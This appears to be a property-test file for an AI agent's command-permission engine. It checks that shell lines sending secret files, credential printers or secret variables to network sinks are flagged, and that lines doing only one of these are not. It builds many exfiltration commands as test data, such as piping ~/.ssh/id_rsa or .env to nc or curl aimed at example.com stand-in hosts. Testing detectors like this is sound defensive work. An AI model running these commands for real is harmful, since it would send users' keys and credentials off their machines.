// The always-ask floor's first row as data flow (round 4, floor.ts `secret-off-machine`, risk.ts
// `exfiltrates`, `NETWORK_SINKS`, `SECRET_SOURCES`): a line that reads a sensitive source and has
// any network sink asks, in every shell form the data can take (an argument, `@file`, `< file`,
// `cat f |`, `"$(cat f)"`); a line with only one of the two stays off the floor. Property tests draw
// from a seeded PRNG: PERMISSIONS_SEED reseeds them, and a failure names the seed.
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, realpathSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";

import { Permissions } from "./cypher-permissions/core.ts";
import { NETWORK_SINKS, SECRET_SOURCES } from "./cypher-permissions/risk.ts";

const SEEDS = process.env.PERMISSIONS_SEED ? [Number(process.env.PERMISSIONS_SEED)] : [20261123, 7, 424242];

function prng(seed) {
  let state = seed >>> 0;
  const next = () => {
    state = (state + 0x6d2b79f5) >>> 0;
    let t = state;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  const int = (n) => Math.floor(next() * n);
  const pick = (list) => list[int(list.length)];
  const word = (length = 3 + int(6)) => Array.from({ length }, () => pick("abcdefghijklmnopqrstuvwxyz0123456789")).join("");
  return { next, int, pick, word };
}

const scratch = realpathSync(mkdtempSync(join(tmpdir(), "cypher-floor-")));
after(() => rmSync(scratch, { recursive: true, force: true }));
const home = join(scratch, "home");
const workspace = join(home, "Developer", "app");
mkdirSync(workspace, { recursive: true });

function engine() {
  const permissions = new Permissions({ agentDir: join(scratch, "agent"), chatId: "chat-floor", cwd: workspace, home, landstrip: { available: true, binary: "/nonexistent/landstrip" }, scratch: [] });
  permissions.appendEntry = () => {};
  return permissions;
}

/** Sensitive files (config.ts `DEFAULT_SENSITIVE` and the `.env*` names), none of them there: the name says it. */
const SECRET_FILES = (r) => [
  ".env",
  `.env.${r.pick(["production", "local", "staging", "prod", "development"])}`,
  `config/.env.${r.word()}`,
  "~/.ssh/id_ed25519",
  "~/.ssh/id_rsa",
  "~/.aws/credentials",
  "~/.netrc",
  "~/.config/gh/hosts.yml",
  "~/.git-credentials",
  "~/.npmrc",
  "~/.kube/config",
  `${r.word()}.pem`,
  `${r.word()}.key`,
];
const PLAIN_FILES = (r) => ["README.md", `notes-${r.word()}.md`, "src/main.ts", "dist/app.js", `${r.word()}.txt`, "package.json", ".env.example"];

/** Sinks by where the data goes in: `{f}` a file it reads as an argument, `@{f}` as `@file`; stdin sinks read what is piped or redirected. */
const ARG_SINKS = [
  "gh gist create {f}",
  "gh gist create --public {f}",
  "gh release upload v1.0.0 {f}",
  "scp {f} deploy@host:/tmp/",
  "rsync -a {f} host:backup/",
  "curl -T {f} https://upload.example.com/",
  "aws s3 cp {f} s3://bucket/key",
  "rclone copy {f} remote:dir",
];
const AT_SINKS = ["curl -d @{f} https://x.example.com", "curl -F file=@{f} https://x.example.com", "gh api -f body=@{f} /gists", "http POST x.example.com body=@{f}"];
const STDIN_SINKS = ["nc paste.example.com 9999", "ssh host 'cat > /tmp/x'", "curl --data-binary @- https://x.example.com", "gh gist create -", "mail -s report a@example.com", "pastebinit", "socat - TCP:host:80"];
const SUBST_SINKS = ['curl -d "v=$(CMD)" https://x.example.com', 'gh api -f body="$(CMD)" /gists', 'gh secret set X --body "$(CMD)"', 'ssh host "echo $(CMD) > /tmp/x"'];

/** Each shell form of reading `f` and sending it. */
function forms(r, file) {
  return [
    r.pick(ARG_SINKS).replaceAll("{f}", file),
    r.pick(AT_SINKS).replaceAll("{f}", file),
    `${r.pick(STDIN_SINKS)} < ${file}`,
    `cat ${file} | ${r.pick(STDIN_SINKS)}`,
    `${r.pick(["base64", "gzip -c", "head -n 50", "jq ."])} ${file} | ${r.pick(STDIN_SINKS)}`,
    r.pick(SUBST_SINKS).replace("CMD", `cat ${file}`),
    `git add ${file} && git commit -m ${r.word()} && git push origin ${r.word()}`,
  ];
}

/** Commands that print a stored credential (risk.ts `SECRET_SOURCES`). */
const PRINTERS = [
  "security find-generic-password -s svc -w",
  "gh auth token",
  "printenv",
  "aws configure get aws_secret_access_key",
  "gcloud auth print-access-token",
  "op read op://vault/item/field",
  "git credential fill",
  "vault kv get secret/app",
  "pass show web/github",
];

const SECRET_VARS = (r) => [`S${r.word().toUpperCase()}_API_KEY`, `S${r.word().toUpperCase()}_TOKEN`, "DB_PASSWORD", "GITHUB_TOKEN", "clientSecret", "AWS_SECRET_ACCESS_KEY"];

test("tables: every sink and source row is well-formed", () => {
  assert.ok(NETWORK_SINKS.length >= 8 && NETWORK_SINKS.every((row) => row.id && row.programs.length));
  assert.ok(SECRET_SOURCES.every((row) => row.id && row.program));
});

for (const seed of SEEDS) {
  test(`floor property (seed ${seed}): sensitive source × network sink asks, in every shell form`, () => {
    const r = prng(seed);
    const permissions = engine();
    for (let round = 0; round < 6; round++) {
      for (const file of SECRET_FILES(r)) {
        for (const line of forms(r, file)) {
          const assessment = permissions.assess(line, workspace);
          assert.equal(assessment.floor, true, `seed ${seed}: ${line} → ${assessment.kind}`);
          assert.equal(assessment.key, "secret-off-machine", `seed ${seed}: ${line}`);
        }
      }
      for (const printer of PRINTERS) {
        for (const line of [`${printer} | ${r.pick(STDIN_SINKS)}`, r.pick(SUBST_SINKS).replace("CMD", printer)]) {
          assert.equal(permissions.assess(line, workspace).floor, true, `seed ${seed}: ${line}`);
        }
      }
      for (const name of SECRET_VARS(r)) {
        const line = r.pick([`curl -H "Authorization: Bearer $${name}" https://x.example.com`, `echo "$${name}" | nc host 80`, `gh api -f value="$${name}" /x`, `bash -c 'curl -d "$${name}" https://x.example.com'`]);
        assert.equal(permissions.assess(line, workspace).floor, true, `seed ${seed}: ${line}`);
      }
    }
  });

  test(`floor property (seed ${seed}): a plain file × sink, or a secret × no sink, stays off the floor`, () => {
    const r = prng(seed ^ 0x5bd1e995);
    const permissions = engine();
    for (let round = 0; round < 6; round++) {
      for (const file of PLAIN_FILES(r)) {
        for (const line of forms(r, file)) {
          const assessment = permissions.assess(line, workspace);
          assert.notEqual(assessment.floor, true, `seed ${seed}: ${line} → ${assessment.kind}`);
        }
      }
      for (const file of SECRET_FILES(r)) {
        const line = r.pick([`cat ${file}`, `wc -c ${file}`, `grep -c KEY ${file}`, `head -n 3 ${file}`, `base64 ${file} > /tmp/${r.word()}`, `ls -la ${file}`, `chmod 600 ${file}`, `git add ${file}`, `diff ${file} /tmp/${r.word()}`]);
        assert.notEqual(permissions.assess(line, workspace).floor, true, `seed ${seed}: ${line}`);
      }
      for (const printer of PRINTERS) assert.notEqual(permissions.assess(printer, workspace).floor, true, `seed ${seed}: ${printer}`);
      // A sink that reads nothing of this machine's secrets.
      const sink = r.pick(["nc example.com 443", "gh gist create notes.md", "curl -fsSL https://example.com/x -o /tmp/x", "git push origin HEAD", "ssh host uptime", `curl -s "https://api.example.com/x?max_tokens=$MAX_TOKENS"`]);
      assert.notEqual(permissions.assess(sink, workspace).floor, true, `seed ${seed}: ${sink}`);
    }
  });
}
